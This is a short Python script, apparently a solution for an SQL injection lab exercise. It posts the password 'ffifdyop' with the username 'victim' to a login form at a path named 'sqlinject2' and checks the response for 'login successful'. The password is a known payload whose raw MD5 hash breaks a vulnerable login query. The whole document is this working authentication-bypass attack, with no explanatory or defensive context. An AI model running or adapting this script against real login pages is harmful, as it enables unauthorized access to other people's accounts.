import requests
import urllib.parse

TARGET = "https://elecos432.org/sqlinject2/"
USERNAME = "victim"

candidates = [
    "ffifdyop"
]

def worked(text: str) -> bool:
    t = text.lower()
    return "login successful" in t

for password in candidates:
    r = requests.post(TARGET, data={
        "username": USERNAME,
        "password": password,
    }, timeout=10)

    print(f"trying {password!r}")

    if worked(r.text):
        print("FOUND:")
        print(urllib.parse.urlencode({
            "username": USERNAME,
            "password": password,
        }))
        break